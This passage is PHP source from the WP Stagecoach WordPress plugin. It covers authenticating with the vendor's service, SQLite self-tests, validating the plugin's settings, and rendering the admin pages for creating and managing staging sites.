<?php
/******************************
* WP Stagecoach Version 1.3.6 *
******************************/

if ( ! defined('ABSPATH') ) {
	die('Please do not load this file directly.');
}

global $wpsc;
if( empty($wpsc) ){
	$wpsc = get_option('wpstagecoach');
}

if( isset( $wpsc['debug-messages'] ) && $wpsc['debug-messages'] ){
	define( 'WPSC_DEBUG', true );
} else {
	define( 'WPSC_DEBUG', false );
}

function wpstagecoach_step_nonce_time() {
	return 120; // 1 minute between steps
}

function wpstagecoach_manual_nonce_time() {
	return 3600; // 30 minutes at generate manual import files screen
}

function wpstagecoach_feedback_nonce_time() {
	return 28800; // 4 hours to report feedback
}

if ( ! function_exists('gzopen') && function_exists('gzopen64') ){
	function gzopen( $filename, $mode, $use_include_path = 0 )
	{
		return gzopen64( $filename, $mode, $use_include_path );
	}
} elseif( ! function_exists( 'gzopen' ) ){
	$errmsg = __( 'Your server does not appear to have either gzip function "gzopen" or "gzopen64", one of which is required by WP Stagecoach.  Please ask your webhost to enable this extension.', 'wpstagecoach' );
	wpsc_display_error( $errmsg );
	return false;
}

function wpsc_check_auth($display_output = true){
	/*******************************************************************************
	*                          function check_auth()                               *
	*     checks the __currently stored__ username & api against the WPSC.com DB   *
	*     returns:                                                                 *
	*		auth_response[] array with                                             *
	*			result     == OK/BAD                                               *
	*			info       == (optional) text info about what happened             *
	*			name       == name of user                                         *
	*			site       == type the currently querying site is: live/stage/null *
	*			live-site  == URL of live site                                     *
	*			stage-site == URL of staging site                                  *
	*******************************************************************************/

	global $wpsc;
	if( empty($wpsc) ){
		if( !$wpsc = get_option('wpstagecoach') )
			$error = true;
		echo 'setting $wpsc in check_auth<br/>';
	}

	if( empty($wpsc['username']) || empty($wpsc['apikey']) ){
		$errmsg = __( 'You must provide a username and an API key.', 'wpstagecoach' );
		$wpsc['errormsg'] = $errmsg;
		update_option('wpstagecoach', $wpsc);

		wpsc_force_redirect( 'admin.php?page=wpstagecoach_settings' );
	
	}
	
	$post_url = WPSTAGECOACH_CONDUCTOR.'/wpsc-auth.php';
	$post_details = array(
		'wpsc-user'	=> $wpsc['username'],
		'wpsc-key'	=> $wpsc['apikey'],
		'wpsc-ver'	=> WPSTAGECOACH_VERSION,
		'site'		=> preg_replace('#https?://#', '',rtrim(site_url(),'/') ),
	);

	$post_options = array();

	// check if we have sqlite3 functions
	if( class_exists( 'SQLite3' ) ){
		$post_options['SQLite3'] = true;
	} else{
		$post_options['SQLite3'] = false;
	}
	if( class_exists( 'SQLite3Stmt' ) ){
		$post_options['SQLite3Stmt'] = true;
	} else{
		$post_options['SQLite3Stmt'] = false;
	}
	if( class_exists( 'SQLite3Result' ) ){
		$post_options['SQLite3Result'] = true;
	} else{ 
		$post_options['SQLite3Result'] = false;
	}
	$post_details['wpsc-options'] = $post_options;
	

	$post_args = array(
		'timeout' => 120,
		'httpversion' => '1.1',
		'body' => $post_details
	);

	global $wpsc_sanity;
	
	if( !isset($wpsc_sanity['https']) ){
		$wpsc_sanity['https'] = wpsc_ssl_connection_test();
	}
	if( $wpsc_sanity['https'] == 'NO_CA' ){
	 	$post_args['sslverify'] = false;
	} elseif( $wpsc_sanity['https'] == 'NO_CURL' ) {
		add_filter('use_curl_transport', '__return_false');
	}


	
	if( !( function_exists( 'gzopen' ) || function_exists( 'gzopen64' ) ) ){
		$errmsg = __( 'Your server does not support either gzip function "gzopen" or "gzopen64", one of which is required by WP Stagecoach.  Please ask your webhost to enable this extension.', 'wpstagecoach' );
		wpsc_display_error( $errmsg );
		return false;
	}
	$post_result = wp_remote_post($post_url, $post_args );

	if( !$auth_info = wpsc_check_post_info('auth', $post_url, $post_details, $post_result, true )){ // we got a negative response from the server...
		delete_transient('wpstagecoach_sanity');
		return false;
	}

	if( $auth_info['result'] != 'OK' && $display_output == true){

		$errmsg = __( '<p>The user name and password did not match.  We received the following error: ', 'wpstagecoach').print_r($auth_info['info'],true).'</p>';
		$wpsc['errormsg'] = $errmsg;
		update_option('wpstagecoach', $wpsc);

		delete_transient('wpstagecoach_sanity');
		wpsc_force_redirect( 'admin.php?page=wpstagecoach_settings' );

		return false;
	}

	if( isset( $auth_info['subscription'] ) && !empty( $auth_info['subscription'] ) ){
		$wpsc['subscription'] = $auth_info['subscription'];
	} else {
		$errmsg  = __( '<p>Your account doesn\'t have an account type associated with it.<br/>Please contact <a href="https://wpstagecoach.com/support/" target="_blank">WP Stagecoach support</a> and include the following information: <pre>', 'wpstagecoach' );
		$errmsg .= 'date: ' . date( 'Y-M-d h:m:s' ) . PHP_EOL;
		$errmsg .= 'post: ' . print_r( $post_details, true );
		$errmsg .= 'auth: ' . print_r( $auth_info, true );
		$errmsg .= '</pre></p>';
		wpsc_display_error( $errmsg );
		return false;
	}

	// single-site stuff
	if( strpos( $auth_info['subscription'], 'single-site' ) !== false ){
		if( isset( $auth_info['single-site'] ) && !empty( $auth_info['single-site'] ) ){
			$wpsc['single-site'] = $auth_info['single-site'];
		} else {
			$wpsc['single-site'] = '';
		}
	}

	// hosting stuff
	if( 'hosting' == $auth_info['subscription'] ){
		$wpsc['hosting'] = $auth_info['hosting'];
	}

	if( isset( $auth_info['alert'] ) && !empty( $auth_info['alert'] ) ){
		echo $auth_info['alert'] . PHP_EOL;
	}

	update_option('wpstagecoach', $wpsc);

	return $auth_info;
}

function wpstagecoach_quick_sqlite3_test() {	
	/*********************************************************************************
	*	does a quick test to make sure we have good sqlite3 functionality
	*	return value:
	*		results of test
	*********************************************************************************/

	$results = array();
	$test_sqlite_file = WPSTAGECOACH_TEMP_DIR . 'testsqlite.db';

	if( class_exists( 'SQLite3' ) ){
		try{
			$sqlitedb = @new SQLite3( $test_sqlite_file );
			if( is_object( $sqlitedb) ){
				$results['sqlt-class'] = get_class( $sqlitedb );
			}
			if( ! method_exists( $sqlitedb, 'exec' ) ){
				$results['sqlt-exec'] = 0;
				return $results;
			}
			if( ! method_exists( $sqlitedb, 'query' ) ){
				$results['sqlt-query'] = 0;
				return $results;
			}

			$results['sqlt-create'] = $sqlitedb->exec( 'CREATE TABLE wpstagecoach ( testcol STRING );' );
			$results['sqlt-insert'] = $sqlitedb->exec( 'INSERT INTO wpstagecoach (testcol) VALUES ("This is a test for ' . get_site_url() . '");' );
			$result = $sqlitedb->query( 'SELECT testcol FROM wpstagecoach;' );
			$string = $result->fetchArray();
			$results['sqlt-select'] = $string[0];

			$results['sqlt-delete'] = $sqlitedb->exec( 'DELETE FROM wpstagecoach;' );

			$sqlitedb->close();
			unlink( $test_sqlite_file );
		}
		catch( SQLite3Exception $e ){
			echo $e->getMessage();
		}

	} else {
		$results['sqlt'] = 0;
	}

	if( class_exists( 'PDO' ) ){
		try{
			$sqlitedb = new PDO( 'sqlite:' . $test_sqlite_file );
			if( is_object( $sqlitedb) ){
				$results['sqlt-pdo-class'] = get_class( $sqlitedb );
			}
			if( ! method_exists( $sqlitedb, 'exec' ) ){
				$results['sqlt-pdo-exec'] = 0;
				return $results;
			}
			if( ! method_exists( $sqlitedb, 'query' ) ){
				$results['sqlt-pdo-query'] = 0;
				return $results;
			}

			$result = $sqlitedb->exec( 'CREATE TABLE wpstagecoach ( testcol STRING );' );
			if( false === $result ){
				$results['sqlt-pdo-create'] = 0;
			} else {
				$results['sqlt-pdo-create'] = 1;
			}
			$results['sqlt-pdo-insert'] = $sqlitedb->exec( 'INSERT INTO wpstagecoach (testcol) VALUES ("This is a test for ' . get_site_url() . '");' );
			$stmt = $sqlitedb->query( 'SELECT testcol FROM wpstagecoach;' );
			$results['sqlt-pdo-select'] = '';
			foreach( $stmt as $string ){
				$results['sqlt-pdo-select'] .= $string[0];
			}
			$results['sqlt-pdo-delete'] = $sqlitedb->exec( 'DELETE FROM wpstagecoach;' );

			$sqlitedb = null;
			unlink( $test_sqlite_file );
		}

		catch( PDOException $e ){
			echo $e->getMessage();
		}

	} else {
		$results['sqlt-pdo'] = 0;
	}

	return $results;
}

function wpsc_display_welcome( $auth_info ){
	/*********************************************************************************
	*	displays the welcome message
	*	requires
	*		$auth_info (response from wpstagecoach.com auth) for full name
	*	return value:
	*		N/A
	*********************************************************************************/

	$name = 'WP Stagecoach Passenger';
	if( $auth_info['subscription'] == 'hosting' ){
		$wpsc = get_option( 'wpstagecoach' );
		if( isset( $wpsc['hosting'] ) && isset( $wpsc['hosting']['name'] ) ){
			$name = $wpsc['hosting']['name'] . ' customer';
		}
	} else {
		if( isset( $auth_info['name'] ) ){
			$name = $auth_info['name'];
		}
	}
	echo '<p>' . __( 'Welcome, ', 'wpstagecoach' ) . $name  .'!</p>';
}

function wpsc_display_main_form( $auth_info, $wpsc ){
	/*********************************************************************************
	*	displays the main page form, depending on the status of the site
	*		(eg, where there is a staging site created, and whether this is the staging or live site)
	*	requires
	*		$auth_info (response from wpstagecoach.com auth) for staging site info
	*	return value:
	*		N/A
	*********************************************************************************/



	switch ($auth_info['type']) {
		case 'null':

			wpsc_display_create_form('wpstagecoach.com', __( 'This site does not have a staging site.', 'wpstagecoach' ), $wpsc);

			return true;
			break;		
		case 'live':
		
			$site_info = explode('.', $auth_info['live-site'] );
			echo '<h3 class="wpstagecoach-textinfo">' . __( 'This is your <b>live</b> site', 'wpstagecoach' ) . '</h3>' . PHP_EOL;
			wpstagecoach_show_staging_site_links( $auth_info, $wpsc );
			echo '<p><form method="post">'.PHP_EOL;
			_e( 'Delete this staging site: ', 'wpstagecoach' );
			echo '<input type="hidden" name="wpsc-delete-site-name" value="'.$site_info[0].'"/><br />'.PHP_EOL;
			echo '<input type="submit" class="button submit-button" name="wpsc-delete-site" value="'. __( 'Delete', 'wpstagecoach' ) .'" onclick="return confirm(\'' . __( 'Whoa there! Are you sure you want to delete this staging site?', 'wpstagecoach' )  . '\')" />'.PHP_EOL;
			echo '</form></p>'.PHP_EOL;
			wpsc_display_sftp_login($auth_info['stage-site'], $auth_info['live-site']);
			return true;
			break;		
		case 'stage':
			echo '<h3 class="wpstagecoach-textinfo">' . __( 'This is your <b>staging</b> site, which has the corresponding live site: ') . '&nbsp;<a href="http://' . $auth_info['live-site'] . '">' . $auth_info['live-site'] . '</a></h3>' . PHP_EOL;
			wpsc_display_sftp_login( $auth_info['stage-site'], $auth_info['live-site'] );
			return true;
			break;

		default:
			$msg = '<p><b>' . __( 'Unrecognized response from the server about the status of this site.', 'wpstagecoach' ) . '</b></p>';
			$msg .= '<p>' . __( 'We received the following response:', 'wpstagecoach' ) . '</p>';
			if( is_string($auth_info['type']) )
				$msg .= __( 'type: ', 'wpstagecoach' ) . $auth_info['type'];
			else
				$msg .= '<pre>$auth_info: '.print_r($auth_info, true).'</pre>'.PHP_EOL;
			wpsc_display_error( $msg );
			return false;
			break;

	} // end of $auth_info switch statement
}

function wpstagecoach_show_staging_site_links( $auth_info, $wpsc, $new = false ){
	$site_link = 'http' . ( isset( $wpsc['is-https'] ) && $wpsc['is-https'] ? 's' : '' ) . '://' . $auth_info['stage-site'];
	$site_lock = ( isset( $wpsc['is-https'] ) && $wpsc['is-https'] ? '<span class="dashicons dashicons-lock wpstagecoach-lock-icon"></span>' : '' );
	if( $new ){
		echo '<p class="wpstagecoach-textinfo">' . __('Here is your new staging site: ', 'wpstagecoach' );
	} else {
		echo '<p class="wpstagecoach-textinfo">' . __('Staging site: ', 'wpstagecoach' );
	}
	echo '&nbsp;<a href="' . $site_link . '" target="_blank">' . $site_lock . $auth_info['stage-site'] . '</a><br/>';
	if( $new ){
		echo __( 'You can log into your new staging site at: ', 'wpstagecoach' );
	} else {
		echo __( 'Staging site log in: ', 'wpstagecoach' );
	}
	echo '<a target="_BLANK" href="' . $site_link . '/wp-admin/">' . $site_lock . $auth_info['stage-site'] . '/wp-admin/</a> ';
	echo '<span class="wpstagecoach-textsmaller">' . __( '(use the same username and password as your live site)', 'wpstagecoach' ) . '</span></p>';
}

function wpsc_check_options_sanity( $wpsc ){
	/*********************************************************************************
	*	takes the current "wpstagecoach" option and checks each $_POST item for some
	*	sanity, and then updates them and returns the updated $wpsc variable
	*	requires
	*		$wpsc -- the current state of the "wpstagecoach" option
	*	return value:
	*		$wpsc -- the updated and sane version back
	*********************************************************************************/
	// have to handle checkboxes different from text info
	$wpstagecoach_settings = array(
		'wpsc-username' => 'username',
		'wpsc-apikey' => 'apikey',
	);
	$wpstagecoach_checkbox_settings = array(
		'wpsc-delete-settings' => 'delete_settings',
		'wpsc-debug' => 'debug',
		'wpsc-advanced' => 'advanced',
		'wpsc-slow' => 'slow',
	);

	foreach ($_POST as $post_name => $post_value) {
		// some quick sanitizing our settings:
		$post_value = trim( $post_value );
		$_POST[ $post_name ] = $post_value;
		switch ( $post_name ) {
			case 'wpsc-username':
				if( !preg_match('/[A-Za-z0-9 _\.@-]/', $post_value ) || strlen( $post_value ) > 60 ){
					$errmsg = sprintf( __( 'Error: Your username, "%s", does not appear to be valid.', 'wpstagecoach' ), $post_value );
					wpsc_display_error( $errmsg );
					return;
				}
				break;
			case 'wpsc-apikey':
				if( '••••••••••••••••••••••••••••••' == $post_value ){ // the default value for the "hidden" password
					unset( $_POST['wpsc-apikey'] );

				} elseif( !ctype_alnum( $post_value ) || strlen( $post_value ) > 64 ){
					$errmsg = sprintf( __( 'Error: Your API key, "%s", does not appear to be valid.', 'wpstagecoach' ), $post_value );
					wpsc_display_error( $errmsg );
					return;
				}
				break;
			// we don't do anything with these.
			case 'wpstagecoach-settings':
			case 'wpstagecoach-settings-main-page-redirect':
				break;
			default: // checkboxes
				if( $post_value != 'on' ){
					$errmsg = sprintf( __( 'Error: the option %s, does not have a valid value.', 'wpstagecoach' ), $post_name );
					wpsc_display_error( $errmsg );
					return;
				}
				break;
		}
	}

	foreach ( $wpstagecoach_settings as $post_val => $opt_val ) {
		if( isset( $_POST[$post_val]) && !empty( $_POST[$post_val] ) ){
			$wpsc[$opt_val] = $_POST[$post_val];
		}
	}
	foreach ($wpstagecoach_checkbox_settings as $post_val => $opt_val) {
		if( isset($_POST[$post_val]) && $_POST[$post_val] == 'on' )
			$wpsc[$opt_val] = true;
		elseif( isset($wpsc[$opt_val]) )
			unset($wpsc[$opt_val]);
	}

	return $wpsc;
} // end wpsc_check_options_sanity

function wpsc_display_create_form($domain, $message, $wpsc, $again=''){
	/*********************************************************************************
	*	displays the form to create a new staging site
	*	requires
	*		$domain -- domain name for staging site
	*		$message -- optional message to display above the form
	*		$again -- put in the text ' again' if you want to append to the button name
	*	return value:
	*		none
	*********************************************************************************/
	$site_name = preg_replace('#https?://#', '', rtrim( site_url(), '/' ) );

	if( strpos( $site_name, '/' ) ){  // if we're in a subdir, we want to use that as the staging site name
		$new_site_name = explode( '/', $site_name );
		$new_site_name = array_pop( $new_site_name );
	} else {
		$new_site_name_array = explode( '.',$site_name );
		$new_site_name = array_shift( $new_site_name_array );
		if( $new_site_name == 'www' )
			$new_site_name = array_shift( $new_site_name_array );
	}

	if( ctype_digit( $new_site_name ) ){
		$new_site_name =  wp_title( '', false );
	}
	$new_site_name = preg_replace("/[^A-Za-z0-9]/", '', $new_site_name );

	if( stripos( site_url(), 'https' ) !== false || stripos( get_option('siteurl'), 'https' ) !== false || isset($_SERVER['HTTPS']) ){
		if( isset( $wpsc['subscription'] ) && strpos( $wpsc['subscription'], 'single-site' ) !== false ){
			$errmsg  = '<h3>Please note:</h3>';
			$errmsg .= '<p>' . __( 'Your site is encrypted using TLS (https (also called SSL)), however, your plan (' . ucwords( str_replace( "-", " ", $wpsc['subscription'] ) ) . ') does not include TLS encryption on the staging site.', 'wpstagecoach' ) . '</p>';
			$errmsg .= __( 'You will almost certainly run into problems while trying to use the staging site on WP Stagecoach because it will not have TLS, but if you know what you are doing, you may continue.', 'wpstagecoach' ) . '</p>';
			$errmsg .= '<p>' . __( 'Please visit <a href="https://wpstagecoach.com/your-account/#subscription" target="_blank">Your Account</a> page to change plans to one that <a href="https://wpstagecoach.com/pricing" target="_blank">supports TLS</a>.', 'wpstagecoach' ) . '</p>';
		} else {
			$errmsg = '<p>' . __( 'Your site is encrypted (https). Some encrypted staging sites may have problems with links or with logging in.  Please contact <a href="https://wpstagecoach.com/support" target="_blank">WP Stagecoach support</a> if you run into problems!', 'wpstagecoach' ) . '</p>';
		}
		wpsc_display_error( $errmsg, false, 'warn' );
	}

	echo '<p>' . $message . '</p>' . PHP_EOL;
	echo '<form method="post" action="'.admin_url('admin.php?page=wpstagecoach').'">';
    _e('<h3>Create a staging site: </h3>', 'wpstagecoach' );
	echo '<input type="hidden" name="wpsc-create-liveurl" value="' . preg_replace('#https?://#', '', site_url() ) . '" />' . PHP_EOL;
	echo '<input type="hidden" name="wpsc-options[is-https]" value="' . ( isset( $wpsc['is-https'] ) ? $wpsc['is-https'] : 0 ) . '" />' . PHP_EOL;
	echo __( 'Staging site url: ', 'wpstagecoach' ) . '<input type="text" size="16" maxlength="16" style="text-align: right" name="wpsc-create-stageurl" class="wpsc-create-stageurl" value="' . strtolower( substr( $new_site_name, 0, 16 ) ) . '" />.' . $domain . '<br />'.PHP_EOL;


	// check if the site is using a different URL than the stored one.

	if( get_option('siteurl') != get_option('home') ){

		$liveurl = $_SERVER['HTTP_HOST'];
		if( strpos( $liveurl, 'http') === false ){
			if( isset($_SERVER['HTTPS']) ){
				$liveurl = 'https://' . $liveurl;
			} else {
				$liveurl = 'http://' . $liveurl;
			}
		}

		$errmsg  = '<h3>' . __( 'WP Stagecoach isn\'t certain what the URL of your site is.', 'wpstagecoach' ) . '</h3>';
		$errmsg .= '<p>' . __( 'On WordPress\'s General Settings page, the Site Address (URL) is set to: ', 'wpstagecoach' ) . '<b>' . get_option( 'siteurl' ) . '</b>, ';
		$errmsg .= __( 'but the actual URL of your site (in the title bar) is: ', 'wpstagecoach' ) . '<b>' . get_option( 'home' ) . '</b></p>';
		$errmsg .= '<p><b>' . __( 'This will make your WP Stagecoach ride less smooth:', 'wpstagecoach' ) . '</b><br/>';
		$errmsg .= __( 'You may experience problems creating the staging site, and incorporating changes back from the staging site will probably need to done manually.', 'wpstagecoach' ) . '</p>';

		$errmsg .= '<p>' . __( 'Select which URL you would like to use, and create a staging site.', 'wpstagecoach' ) . '</p>';
		$errmsg .= '<p><input type="radio" name="wpsc-create-liveurl" id="stored" value="' . preg_replace( '#https?://#', '', get_option( 'siteurl' ) ) . '" checked>';
		$errmsg .= '<label for="stored">' . __( 'Stored URL (in the database): ', 'wpstagecoach' ) . '<b>' . get_option( 'siteurl' ) . '</b> <small>' . __( '(Try this one first)', 'wpstagecoach' ) . '</small></label></p>';
		$errmsg .= '<p><input type="radio" name="wpsc-create-liveurl" id="actual" value="' . preg_replace( '#https?://#', '', get_option( 'home' ) ) . '">';
		$errmsg .= '<label for="actual">' . __( 'Actual URL (in the titlebar): ', 'wpstagecoach' ) . '<b>' . get_option( 'home' ) . '</label></b></p>';
		$errmsg .= '<p>' . __( 'If the staging site doesn\'t work, delete it and try again with the other URL', 'wpstagecoach' ) . '</p>';
		wpsc_display_error($errmsg);

	} ?>

	<p>
		<input type="checkbox" id="caching" name="wpsc-options[disable-caching-plugins]" />&nbsp; 
		<label for="caching"><?php _e( 'Disable caching plugins on staging site', 'wpstagecoach' ); ?></label>
		<a href="#" class="tooltip"><i class="dashicons dashicons-info"></i><span class="open"><b></b>If you are using a caching plugin, your staging site might show you cached pages instead of reflecting the changes you make on the staging site.  Selecting this option will automatically deactivate your caching plugin.</span></a>
		<span class="caching more-info" style="display: none;">
			<?php _e( 'Note: If you activate or deactivate any plugins on your staging site, you will need to reactivate the caching plugin after you import changes.', 'wpstagecoach' ); ?>
		</span>
	</p>

	<p>
		<input type="checkbox" id="password" name="wpsc-options[password-protect]" />
		<label for="password"><?php _e( 'Password protect the staging site', 'wpstagecoach' ); ?></label>
		<a href="#" class="tooltip"><i class="dashicons dashicons-info"></i><span class="open"><b></b>Select this option if you want to require visitors to enter in a password before they can view the staging site.</span></a>
	</p>

	<div class="password" style="display: none;">
		<p><?php _e( 'Specify the username and password<span class="wpstagecoach-textsmaller">(please use only letters or numbers)</span>', 'wpstagecoach' ); ?><br />
			<?php _e( 'Username: ', 'wpstagecoach' ); ?><input type="text" name="wpsc-options[password-protect-user]" maxlength="32" /><br />
			<?php _e( 'Password: ', 'wpstagecoach' ); ?><input type="text" name="wpsc-options[password-protect-password]" maxlength="32" />
	</div>

	<?php 
	if( isset( $wpsc['subscription'] ) && strpos( $wpsc['subscription'], 'single-site' ) === false ){
		if( strpos($new_site_name, 'localhost') !== false || (!empty($wpsc['advanced']) && $wpsc['advanced'] == true) ){
			if( strpos($new_site_name, 'localhost') !== false ) {
				_e( '<p>It looks like your live site is running on your local machine. To make your images visible to the internet, you must select the checkbox below.</p>', 'wpstagecoach' );
			} ?>

		<p>
			<input type="checkbox" id="hotlink" name="wpsc-options[no-hotlink]" />&nbsp; 
			<label for="hotlink"><?php _e( 'Don\'t <a href="https://wpstagecoach.com/question/wp-stagecoach-use-hotlinking/" target="_blank">hotlink images</a> on the staging site. ', 'wpstagecoach' ); ?></label>
			<a href="#" class="tooltip"><i class="dashicons dashicons-info"></i><span class="open"><b></b>WP Stagecoach does not copy all of your media files to your staging site, but just links to the images on your live site.  Most of the time, this works fine, but some plugins or themes don't work properly with it.</span></a>
			<span class="hotlink more-info" style="display: none;">
				<?php _e( 'This may make the staging site creation take a very long time.', 'wpstagecoach' ); ?>
			</span>
		</p>
	<?php
			}
		} elseif( isset( $wpsc['subscription'] ) && strpos( $wpsc['subscription'], 'single-site' ) !== false ) { // we have a single-site
			if( !isset( $wpsc['single-site'] ) || empty( $wpsc['single-site'] ) ){
				echo '<div class="wpstagecoach-warn"><p>' . __('Your subscription only lets you use WP Stagecoach on a single URL - ', 'wpstagecoach' ) ;
				echo '' . sprintf( __('clicking "Ride the Stagecoach!" will permanently link this URL (%s) to your API key.', 'wpstagecoach' ), preg_replace('#https?://#', '', site_url() ) ) . '</p></div><br/>';
			}
		}
	?>

	<input type="submit" class="button submit-button" name="wpsc-create" value="<?php echo __( 'Ride the Stagecoach', 'wpstagecoach' ) . $again . '!'; ?>" >
	</form>
<?php 
}

function wpsc_display_header() {
	?>
	<div class="wpstagecoach-wrapper wrap">
	<div class="wpstagecoach-header">
		<div class="wpstagecoach-branding">
			<a href="http://wpstagecoach.com" target="_blank">
				<img src="<?php echo WPSTAGECOACH_PLUGIN_URL; ?>assets/wpsc-logo-tiny.png" align="left" />
			</a>
			<h1><?php _e( 'WP Stagecoach' , 'wpstagecoach' ); ?></h1>
			<p>v <?php echo WPSTAGECOACH_VERSION; ?></p>
		</div>
		<?php $wpsc = get_option( 'wpstagecoach' );
		if( is_array( $wpsc ) &&  isset( $wpsc['subscription'] ) && 'hosting' == $wpsc['subscription'] ) { ?>
			<div class="wpstagecoach-cobranding">
				<?php
				$hosting_url = '';
				$hosting_url_close = '';
				if( isset( $wpsc['hosting'] ) && isset( $wpsc['hosting']['url'] ) ){
					$hosting_url = '<a href="' . $wpsc['hosting']['url'] . '" target="_blank">';
					$hosting_url_close = '</a>';
				}

				$hosting_logo = '';
				if( isset( $wpsc['hosting'] ) && isset( $wpsc['hosting']['logo'] )  ){
					$hosting_logo = $hosting_url;
					$hosting_logo .= '<img src="' . $wpsc['hosting']['logo'] . '"';
					if( isset( $wpsc['hosting'] ) && isset( $wpsc['hosting']['name'] ) && !empty( $hosting_logo ) ){
						$hosting_logo .= ' alt="' . $wpsc['hosting']['name'] . '">';
					} else {
						$hosting_logo .= '>';
					}
					$hosting_logo .= $hosting_url_close;
				}

				$hosting_providedby = '';
				if( isset( $wpsc['hosting'] ) && isset( $wpsc['hosting']['name'] ) ){
					$hosting_providedby = '<h3>' . sprintf( __( 'Provided by %s', 'wpstagecoach' ), $hosting_url . $wpsc['hosting']['name'] . $hosting_url_close ) . '</h3>' . PHP_EOL;
				}
				echo $hosting_logo;
				echo $hosting_providedby;
			?>
			</div>
		<?php } ?>
	</div>
	<?php if( is_array( $wpsc ) &&  isset( $wpsc['hosting']['message'] ) && !empty( $wpsc['hosting']['message'] ) ) { ?>
		<div class="wpstagecoach-hosting-message">
			<?php echo $wpsc['hosting']['message']; ?>
		</div>
	<?php } ?>
	<div id="wpstagecoach-content">
<?php 
}

function wpsc_display_footer() {
	?>
	</div><!-- wpstagecoach-content -->
	</div><!-- wpstagecoach-wrapper -->
	<?php 
}


function wpsc_display_sidebar() { 
	$wpsc = get_option( 'wpstagecoach' ); 
	if( isset( $wpsc['subscription'] ) && 'hosting' == $wpsc['subscription'] && isset( $wpsc['hosting']['support'] ) ) {
		if( filter_var( $wpsc['hosting']['support'], FILTER_VALIDATE_EMAIL ) ) {
			$support_link = 'mailto:'.$wpsc['hosting']['support'];
		} else {
			$support_link = $wpsc['hosting']['support'];
		}
	} else {
		$support_link = 'https://wpstagecoach.com/support';
	}
		?>
	<aside id="wpstagecoach-aside">
		<h3><?php _e( 'Howdy, WP Stagecoach Passenger!' , 'wpstagecoach' ); ?></h3>
		<h4><?php _e( 'Need help?' , 'wpstagecoach' ); ?></h4>
		<ul>
			<li><a href="https://wpstagecoach.com/support/instructions" target="_blank"><?php _e( 'Instructions' , 'wpstagecoach' ); ?></a></li>
			<li><a href="https://wpstagecoach.com/support/faq" target="_blank"><?php _e( 'FAQ' , 'wpstagecoach' ); ?></a></li>
			<li><a href="https://wpstagecoach.com/support/troubleshooting-common-issues/" target="_blank"><?php _e( 'Troubleshooting', 'wpstagecoach' ); ?></a></li>
			<li><a href="<?php echo $support_link; ?>" target="_blank"><?php _e( 'Contact Support', 'wpstagecoach' ); ?></a></li>
		</ul>
		<?php if( isset( $wpsc['subscription'] ) && 'hosting' !== $wpsc['subscription'] ) { ?>
			<p><a href="https://wpstagecoach.com/your-account/" target="_blank"><strong><?php _e( 'Your Account:' , 'wpstagecoach' ); ?></strong></a><?php _e( ' get your API key, manage all of your staging sites' , 'wpstagecoach' ); ?></p>
		<?php } ?>
	</aside>
<?php }

function wpsc_check_post_info($action, $url, $post_args, $post_result, $display_output=true){
	/*********************************************************************************
	*	displays an error if we get a null response from WPSC.com
	*	requires
	*		$action (description of what we tried to do)
	*		$url (where we tried to go)
	*		$post_args -- the post_args that were passed to wp_remote_post
	*		$post_result -- from WordPress's wp_remote_post
	*	return value:
	*		decoded response of body from remote script
	*		false if we got a negative response
	*********************************************************************************/
	global $wpsc;
	$error = false;
	if( empty($wpsc) ){
		$wpsc = get_option( 'wpstagecoach' );
		if(WPSC_DEBUG)
			echo 'setting $wpsc in wpsc_check_post_info(), action: '.$action.'<br/>';
	}

	if( is_wp_error( $post_result ) ) {
		$error_message = $post_result->get_error_message();
		$errmsg  = '<p>' . __( 'Website connection error with url: ', 'wpstagecoach' ) . $url . ' <br/>' . PHP_EOL;
		$errmsg .= '<b>' . $error_message . '</b><.p>' . PHP_EOL;
		$error = true;
	}

	if( is_array( $post_result ) && !empty( $post_result['body'] ) ){
		$response = json_decode( base64_decode( rtrim( strip_tags( $post_result['body'] ) ) ), true);

		if( !empty( $response ) && !isset( $response['info'] ) ){
			$response['info'] = '';
		}

		if( $post_result['response']['message'] != 'OK' && $post_result['response']['code'] != 200 ){ // make sure we got an OK response.
			$errmsg  = '<p>' . __( 'We got a bad HTTP response from the server url: ', 'wpstagecoach' ) . $url .'<br/>'.PHP_EOL;
			if( isset( $post_result['response']['code'] ) ){
				$errmsg .= __( 'Error code: ', 'wpstagecoach' ) . $post_result['response']['code'] . '<br/>' . PHP_EOL;
				$errmsg .= __( 'Message: ', 'wpstagecoach' ) . $post_result['response']['message'] . '</p>' . PHP_EOL;
			}
			$error = true;
		} elseif( empty($response) && $post_result['body'] == 'Go away.'  ){  // check if we are getting a bad response early on.
			$errmsg  = '<p>' . __( 'Somehow the plugin didn\'t supply enough information to WP Stagecoach to complete the following: ', 'wpstagecoach' ) . $action . '<br/>' . PHP_EOL;
			$errmsg .= __( 'Please contact WP Stagecoach Support with the following information: ', 'wpstagecoach' ) . '</p>' . PHP_EOL;
			$error = true;
		} elseif( !is_array( $response ) ){
			$errmsg  = '<p><b>' . __( 'Error!  $post_result did not decode!', 'wpstagecoach' ) . '</b><br/>';
			$errmsg .= __( 'Please contact <a href="https://wpstagecoach.com/support">WP Stagecoach support</a> with the following information:', 'wpstagecoach' ) . PHP_EOL;
			$errmsg .= '<p>' . __( 'The Full $post_result[\'body\'] is as follows: ', 'wpstagecoach' ) . '<br/><hr/>'.PHP_EOL;
			$temp = strip_tags( $post_result['body'] );
			if( !empty( $temp ) )
				$errmsg .= '<b>'.print_r( $post_result['body'], true ).'</b></p>'.PHP_EOL;
			else
				$errmsg .= '<b>$post_result[\'body\'] ' . __( 'is empty!', 'wpstagecoach' ) . '</b></p>'.PHP_EOL;
			$error = true;
		
		} elseif( $response['result'] != 'OK' ){ // $response must be an array, and hopefully $response['info'] is a string
			if( !is_string( $response['info'] ) ){  // if it isn't a string, we'll make it one!
				$response['info'] = print_r( $response['info'], true );
			}
			if( $response['result'] == 'OTHER' ) { // OTHER -- we will just pass this back to the application & let it deal with it!
				return $response;
			} elseif( stripos( $response['info'], 'license has expired') !== false ) {
				$errmsg  = '<b>' . __( 'It looks like your license has expired.', 'wpstagecoach' ) . '</b><br/>' . PHP_EOL;
				$errmsg .= __('Please check your <a href="https://wpstagecoach.com/your-account" target="_blank">your account page on wpstagecoach.com</a> for more information.', 'wpstagecoach' ) . '</p>' .PHP_EOL;
				wpsc_display_error( $errmsg, false );
				die;
			} elseif( stripos( $response['info'], 'Could not find username') !== false ) {
				$errmsg  = '<p>' . __( 'Invalid username.  You entered: "', 'wpstagecoach' );
				$errmsg .= $wpsc['username'];
				$errmsg .= __( '".  Please be sure this is correct!', 'wpstagecoach' ) . '<br/>' .PHP_EOL;
